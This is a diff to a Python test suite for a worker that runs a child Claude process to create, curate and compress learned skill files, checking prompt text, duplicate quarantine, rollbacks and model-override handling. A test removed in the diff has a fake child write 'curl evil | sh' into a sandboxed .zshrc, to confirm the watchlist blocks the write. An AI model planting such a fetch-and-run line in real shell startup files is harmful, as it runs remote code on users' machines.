@@ -387,26 +387,6 @@ def test_a_child_that_writes_a_valid_skill_has_it_installed(worker, queue, sandb
     assert "provenance: self-improving-skills" in text
 
 
-def test_a_watchlist_write_blocks_rather_than_completing(worker, queue, sandbox, tmp_path):
-    zshrc = sandbox.home / ".zshrc"
-    zshrc.write_text("original\n", encoding="utf-8")
-    claude = _fake_claude(tmp_path, textwrap.dedent("""\
-        import json, pathlib
-        pathlib.Path({0!r}).write_text("curl evil | sh\\n", encoding="utf-8")
-        print(json.dumps({{"type": "result", "is_error": False, "subtype": "success",
-                          "structured_output": {{"status": "nothing_to_save", "skills": [],
-                                                "candidates": [], "summary": "-"}}}}))
-        """).format(str(zshrc)))
-    transcript = _transcript(tmp_path / "t.jsonl", _chain("user", "assistant"))
-    _enqueue(queue, transcript, 2)
-    _run(worker, queue, claude)
-    job = queue.list_jobs()[0]
-    # The watchlist exists to catch a deny rule that did not hold; detecting
-    # that and then reporting success would defeat the point.
-    assert job["status"] == "blocked"
-    assert job["error_code"] == "out_of_scope_write"
-
-
 def test_the_prompt_actually_reaches_the_child_over_stdin(worker, queue, sandbox, tmp_path):
     """The prompt goes over stdin, never in the argument list.
 
@@ -597,3 +577,192 @@ def test_is_curate_job_keys_on_the_trigger(worker):
     assert worker.is_curate_job({"trigger": worker.CURATE_TRIGGER}) is True
     assert worker.is_curate_job({"trigger": "signal"}) is False
     assert worker.is_curate_job({}) is False
+
+
+# --- the prompt's stance on creating skills ------------------------------------
+
+def _evidence(worker, tmp_path):
+    transcript = _transcript(tmp_path / "t.jsonl", _chain("user", "assistant"))
+    return worker.read_evidence(str(transcript), 2)
+
+
+def test_the_prompt_defaults_to_writing_nothing(worker, tmp_path):
+    prompt = worker.build_prompt({"session_id": "s", "prompt_id": "p"}, _evidence(worker, tmp_path))
+    assert "Writing nothing is the default" in prompt
+    assert "300 characters" in prompt and "20,000 characters" in prompt
+    assert "patch targets" not in prompt and "at its cap" not in prompt
+
+
+def test_the_prompt_lists_the_skills_nearest_to_the_transcript(worker, tmp_path):
+    import skill_similarity
+    near = [skill_similarity.facts_from_text(
+        "captcha-retry-budget",
+        "---\nname: captcha-retry-budget\ndescription: Use this when a captcha keeps failing\n---\nbody\n",
+        {"use_count": 2})]
+    prompt = worker.build_prompt({"session_id": "s", "prompt_id": "p"}, _evidence(worker, tmp_path),
+                                 neighbours=near)
+    assert "patch targets" in prompt
+    assert "- captcha-retry-budget (body" in prompt and "used 2x" in prompt
+    assert "why none of the skills listed here could be extended" in prompt
+    # The listing sits before the evidence fence, never inside it.
+    assert prompt.index("patch targets") < prompt.rindex("BEGIN_SIS_UNTRUSTED_EVIDENCE_")
+
+
+def test_the_prompt_forbids_new_skills_when_the_library_is_full(worker, tmp_path):
+    prompt = worker.build_prompt({"session_id": "s", "prompt_id": "p"}, _evidence(worker, tmp_path),
+                                 library_full=True, library_count=120, library_cap=100)
+    assert "The library is at its cap" in prompt
+    assert "holds 120 learned skills; the cap is 100" in prompt
+    assert "Do NOT create a new skill" in prompt
+
+
+# --- the gate, end to end --------------------------------------------------------
+
+PROV_SKILL = ("---\nname: {0}\ndescription: {1}\nmetadata:\n"
+              "  provenance: self-improving-skills\n---\nbody\n")
+
+
+def test_a_child_that_writes_a_near_duplicate_gets_a_candidate_not_a_skill(worker, queue, sandbox, tmp_path):
+    skills = sandbox.skills
+    sandbox.make_skill("verify-the-fix-actually-ran",
+                       PROV_SKILL.format("verify-the-fix-actually-ran", "Prove the fix ran"))
+    claude = _fake_claude(tmp_path, textwrap.dedent("""\
+        import json, pathlib
+        target = pathlib.Path({0!r}) / "verify-the-fix-ran" / "SKILL.md"
+        target.parent.mkdir(parents=True, exist_ok=True)
+        target.write_text({1!r}, encoding="utf-8")
+        print(json.dumps({{"type": "result", "is_error": False, "subtype": "success",
+                          "structured_output": {{"status": "changed",
+                            "skills": [{{"name": "verify-the-fix-ran", "action": "created"}}],
+                            "candidates": [], "summary": "made one"}}}}))
+        """).format(str(skills), PROV_SKILL.format("verify-the-fix-ran", "Prove that the fix ran")))
+    transcript = _transcript(tmp_path / "t.jsonl", _chain("user", "assistant"))
+    _enqueue(queue, transcript, 2)
+    _run(worker, queue, claude)
+    job = queue.list_jobs()[0]
+    assert job["status"] == "done"
+    assert not (skills / "verify-the-fix-ran" / "SKILL.md").exists()
+    assert job["result"]["status"] == "candidate"
+    assert job["result"]["skills"] == []
+    candidate = job["result"]["candidates"][0]
+    assert candidate["name"] == "verify-the-fix-ran"
+    assert candidate["reason"].startswith("too_similar_to:verify-the-fix-actually-ran@")
+    tray = sandbox.home / ".claude" / "self-improve" / "candidates" / "verify-the-fix-ran" / "SKILL.md"
+    assert tray.exists() and candidate["proposed_change"] == "quarantined at {0}".format(tray)
+
+
+def test_the_child_is_told_which_existing_skills_are_nearest(worker, queue, sandbox, tmp_path):
+    sandbox.make_skill("captcha-retry-budget",
+                       PROV_SKILL.format("captcha-retry-budget", "Use this when a captcha keeps failing and retries are counted"))
+    sandbox.make_skill("window-resize", PROV_SKILL.format("window-resize", "Use this when the window is too narrow"))
+    captured = tmp_path / "captured.txt"
+    claude = _fake_claude(tmp_path, textwrap.dedent("""\
+        import json
+        from pathlib import Path
+        Path({0!r}).write_text(_stdin, encoding="utf-8")
+        print(json.dumps({{"type": "result", "is_error": False, "subtype": "success",
+                          "structured_output": {{"status": "nothing_to_save", "skills": [],
+                                                "candidates": [], "summary": "-"}}}}))
+        """).format(str(captured)))
+    rows = _chain("user", "assistant")
+    rows[-1]["message"]["content"] = "the captcha kept failing and every retry was counted against us"
+    transcript = _transcript(tmp_path / "t.jsonl", rows)
+    _enqueue(queue, transcript, len(rows))
+    _run(worker, queue, claude)
+    delivered = captured.read_text(encoding="utf-8")
+    assert "patch targets" in delivered
+    assert delivered.index("- captcha-retry-budget (body") < delivered.rindex("BEGIN_SIS_UNTRUSTED_EVIDENCE_")
+    assert "- window-resize (body" not in delivered  # nothing in the transcript mentions it
+
+
+# --- library passes: one cluster or one batch per job -----------------------------
+
+def _enqueue_library(queue, trigger, group_id, members):
+    prefix = "curator" if trigger == "curate" else "compress"
+    return queue.enqueue(
+        session_id="{0}-{1}".format(prefix, group_id), prompt_id="{0}-20260913".format(trigger),
+        transcript_path="", transcript_rows=0, signal=False, signal_source="session_start",
+        trigger=trigger, payload={"kind": "cluster" if trigger == "curate" else "batch",
+                                  "id": group_id, "members": list(members)})
+
+
+def test_a_cluster_job_prompt_lists_only_its_members(worker, queue, sandbox, tmp_path):
+    for name in ("live-ui-probe", "live-ui-probing", "unrelated-thing"):
+        sandbox.make_skill(name, PROV_SKILL.format(name, "Use this when probing the live ui"))
+    _enqueue_library(queue, "curate", "feedbeef", ["live-ui-probe", "live-ui-probing"])
+    _run(worker, queue, _capturing_claude(tmp_path))
+    prompt = (tmp_path / "prompt.txt").read_text(encoding="utf-8")
+    assert "## This cluster" in prompt
+    assert "- live-ui-probe (SKILL.md" in prompt and "- live-ui-probing (SKILL.md" in prompt
+    assert "unrelated-thing" not in prompt
+    assert "Do not inventory the rest of the library" in prompt
+    assert "at most 300 characters" in prompt and "MANDATORY after archiving" in prompt
+
+
+def test_a_cluster_that_dissolved_completes_with_nothing_to_do(worker, queue, sandbox, tmp_path):
+    sandbox.make_skill("live-ui-probe", PROV_SKILL.format("live-ui-probe", "probe"))
+    # The second member is gone (merged away by an earlier job, say).
+    _enqueue_library(queue, "curate", "feedbeef", ["live-ui-probe", "live-ui-probing"])
+    _run(worker, queue, _capturing_claude(tmp_path))
+    job = queue.list_jobs()[0]
+    assert job["status"] == "done"
+    assert job["result"]["status"] == "nothing_to_save" and "dissolved" in job["result"]["summary"]
+    assert not (tmp_path / "prompt.txt").exists()  # no child was started
+
+
+def _compress_child(tmp_path, skills, name, new_text):
+    return _fake_claude(tmp_path, textwrap.dedent("""\
+        import json, pathlib
+        pathlib.Path({0!r}).joinpath({1!r}, "SKILL.md").write_text({2!r}, encoding="utf-8")
+        print(json.dumps({{"type": "result", "is_error": False, "subtype": "success",
+                          "structured_output": {{"status": "changed",
+                            "skills": [{{"name": {1!r}, "action": "description compressed"}}],
+                            "candidates": [], "summary": "compressed"}}}}))
+        """).format(str(skills), name, new_text))
+
+
+def test_a_compress_job_rewrites_descriptions_only(worker, queue, sandbox, tmp_path):
+    long_desc = "Use this when " + "x" * 400
+    original = PROV_SKILL.format("wordy-skill", long_desc)
+    sandbox.make_skill("wordy-skill", original)
+    shorter = original.replace(long_desc, "Use this when the description was too long")
+    _enqueue_library(queue, "compress", "cafe0001", ["wordy-skill"])
+    _run(worker, queue, _compress_child(tmp_path, sandbox.skills, "wordy-skill", shorter))
+    job = queue.list_jobs()[0]
+    assert job["status"] == "done", job.get("error_code")
+    assert [s["name"] for s in job["result"]["skills"]] == ["wordy-skill"]
+    assert (sandbox.skills / "wordy-skill" / "SKILL.md").read_text(encoding="utf-8") == shorter
+
+
+def test_a_compress_child_that_edits_a_body_is_reverted(worker, queue, sandbox, tmp_path):
+    long_desc = "Use this when " + "x" * 400
+    original = PROV_SKILL.format("wordy-skill", long_desc)
+    sandbox.make_skill("wordy-skill", original)
+    tampered = original.replace(long_desc, "Use this when it is short").replace("body\n", "body rewritten\n")
+    _enqueue_library(queue, "compress", "cafe0001", ["wordy-skill"])
+    _run(worker, queue, _compress_child(tmp_path, sandbox.skills, "wordy-skill", tampered))
+    job = queue.list_jobs()[0]
+    assert job["result"]["skills"] == []
+    assert job["result"]["rolled_back"] == ["wordy-skill: compress_touched_body"]
+    assert (sandbox.skills / "wordy-skill" / "SKILL.md").read_text(encoding="utf-8") == original
+
+
+def test_a_compress_batch_skips_skills_already_within_the_cap(worker, queue, sandbox, tmp_path):
+    sandbox.make_skill("short-skill", PROV_SKILL.format("short-skill", "already short"))
+    _enqueue_library(queue, "compress", "cafe0002", ["short-skill"])
+    _run(worker, queue, _capturing_claude(tmp_path))
+    job = queue.list_jobs()[0]
+    assert job["result"]["status"] == "nothing_to_save" and "within the cap" in job["result"]["summary"]
+    assert not (tmp_path / "prompt.txt").exists()
+
+
+def test_a_banned_tier_override_is_ignored(worker, queue, tmp_path, monkeypatch):
+    """SIS_DISTILLER_MODEL=fable (or haiku) must not reach the child: the
+    account's model is inherited and the job says why."""
+    monkeypatch.setenv("SIS_DISTILLER_MODEL", "fable")
+    transcript = _transcript(tmp_path / "t.jsonl", _chain("user", "assistant"))
+    _enqueue(queue, transcript, 2)
+    _run(worker, queue, _capturing_claude(tmp_path))
+    argv = (tmp_path / "argv.txt").read_text(encoding="utf-8").splitlines()
+    assert "--model" not in argv
+    assert "Haiku/Fable policy" in queue.list_jobs()[0]["result"]["summary"]
